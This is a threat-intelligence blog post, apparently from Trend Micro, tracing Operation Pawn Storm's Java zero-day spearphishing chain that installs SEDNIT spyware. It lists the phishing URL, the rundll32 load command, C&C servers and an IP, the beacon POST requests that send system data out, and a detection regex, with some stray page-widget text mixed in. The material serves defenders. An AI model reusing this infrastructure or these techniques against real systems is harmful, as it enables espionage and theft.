The attackers behind Operation Pawn Storm have been active since at least 2007 and they continue to launch new campaigns.Over the past year or so, we have seen numerous techniques and tactics employed by this campaign, such as the use of an iOS espionage app, and the inclusion of new targets like the White House. Through our on-going investigation and monitoring of this targeted attack campaign, we found suspicious URLs that hosted a newly discovered zero-day exploit in Java now identified by Oracle as CVE-2015-2590. This is the first time in nearly two years that a new Java zero-day vulnerability was reported.The report below outlines the traffic observed as part of the attack, not the exploit itself. Our blog entry on how the exploit itself works can be found here. This blog entry is intended to help readers identify traffic in their network that would indicate if such an exposure had occurred. We strongly recommend that all readers roll out the Oracle patch as soon as possibleInfection sequenceTrend Micro has observed that an entity belonging to the target profile received an email that contains the following URL:hxxp://ausameetings[.]com/url?={BLOCKED}/2015annualmeeting/It is worth noting that the spearphishing domain used is ausameetings[.]com, a play on the valid domain “ausameetings.org,” which is a site for AUSA’s (Association of the United States Army) annual exposition, commonly held in mid-October. The domain was only registered last July 8, which implies a one-time use for a specific set of targets.When assessing this URL, it was determined that the most probable infection sequence is:Figure 1.

In Stage 1, the sequence is initiated by clicking on the URL embedded within the victim’s spearphishing email.Latest TweetsOnce the Java exploit of Stage 1 is successful, it downloads the PE file (Stage 2). Once the PE file is downloaded and executed it drops and runs the DLL file (Stage 3) which is the final component to infect the machine with SEDNIT.The information that we have on each of these steps is as follows. Further information on each of these stages can be found in the sections below.Fake porn sites lead to #mobile #malware bit.ly/1P1oGlw about 4 hours ago#IoT's growing popularity raises safety concerns due to lack of regulation: bit.ly/1RVzrpkYour email hereSubscribeStage3.

Traffic patterns (click the image to enlarge)One can observe that the second call sends a POST to ausumeetings[.]com, and is returned with a text responsecfa that then subsequently is used as the URI path for the subsequent HTTP requests.Stage 2 – The PE fileStage 2 involves downloading a PE file. Trend Micro detects this file as TROJ_DROPPR.CXC. The primary purpose of this PE is to drop and load the DLL executable. It is downloaded as Cormac.mcr, but once extracted, the file name is converted into a randomized file name. It is installed into the %USERPROFILE% directory and then executed, creating a service by the same name.During its installation, a variety of other services also appear to be hooked, including lsass, lsm, and conhost, amongst others.Figure 3. Observed processes (click the image to enlarge)Once the malware is executed, it will drop the Stage 3 DLL file with filename api-ms-win-downlevel- profile-l1-1-0.dll in the %TEMP% directory. To load the malware, it executes rundll32.exe using the following command:rundll32.exe “%temp%/api-ms-win-downlevel-profile-l1-1-0.dll”,initStage 3 – The DLL fileThis third stage involves a DLL file, which we detect as TSPY_SEDNIT.C. When the PE file triggers the DLL (in this instance, %windir%\system32\RunDll32.exe Command: “%windir%\system32\RunDll32.exe ” “C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\ap i-ms-win- downlevel-profile-l1-1-0.dll”,init), the following traffic was observed.12345POST /ESL/YxF8bM/f/MFS.pdf/?duJ=OJYKZRlzy1tddcpaKjU= HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: www.google.comContent-Length: 0Note: Assumed to be a local connectivity test traffic call.POST /RGLw/ofEK/5w2a.htm/?6=9SpyZtTPs1iQybJZ54k= HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: 192[.]111[.]146[.]185Content-Length: 830POST /hP/Bo/S/2z.htm/?WDC=TJrXZm1/FlgpeRdZXjk= HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: www.google.comContent-Length: 0Note: Assumed to be a local connectivity test traffic call.POST /C9zl/LJ9.zip/?hP=mLgAZ7ldwVn9W8BYihs= HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: 192[.]111[.]146[.]185Content-Length: 0POST /k9/eR3/a/UE/eR.pdf/?bKC=xCCmnuXFZ6Chw2ah1oM= HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: 192[.]111[.]146[.]185Content-Length: 26It bears stressing that we do not encourage using the data presented above as IOCs for your own analysis. The network traffic generated by this stage was a challenge to assess as it appears to have polymorphic capabilities in the creation of URI paths utilized to pull down files. After assessing the samples multiple times, each network traffic infection sequence appeared to be different, no matter what sequence of testing was performed (e.g., same machine, different machines, different geographic IP space globally, etc.).After detailed network forensics of the traffic, it was determined that no single stable URL path or URI query component (URI path component, file name, or URI query parameter) showed a consistent pattern (either same entry nor regex definable pattern), and further reverse engineering was required to determine the methods used to achieve this.As a result of this additional analysis, it was determined that the URI path is a random generated string with the following pattern:^/([a-zA-Z0-9]{1,6}/){1,5}[a-zA-Z0-9]{1,7}\.(xml|pdf|htm|zip)/\?[a-zA-Z0-9]{1,3}=<Encoded ID>Figure 4. Regex expressionIncluded in the POST request is a data encoded with Base64 and XOR encryption. The encoded data contains the following system information of the infected machine:OS Version List of running processes Hard Disk Drive Information Volume Serial NumberTSPY_SEDNIT.C connects to three C&C servers:192[.]111[.]146[.]185 (direct to IP call) www[.]acledit[.]com www[.]biocpl[.]orgAfter sending the encrypted data it will wait for a reply which is encrypted by the same algorithm above.Phase 2 of the attack: the keystroke loggerBased on our investigation of Operation Pawn Storm, we know that the infection happens in two stages:In phase 1, opening the email attachment or clicking on the malicious URI initiates the download of the first level dropper, which installs the downloader component (.DLL file). In phase 2, the downloader component communicates with a C&C server and downloads other components, and at the end of the chain a keylogger is installer. The keylogger sends data back to the C&C server.As of writing, we have not succeeded in triggering Phase 2, which will download a fourth stage malware from the C&C servers. This fourth stage malware is expected to be an encrypted executable file.Victims of the AttackA number of victims were identified during the course of our investigation. The targets are in the United States or Canada, and those we were able to identify via IP are big defense contractors, as typical for Operation PawnStorm.CountermeasuresTrend Micro is already able to protect users against this threat without any necessary updates.
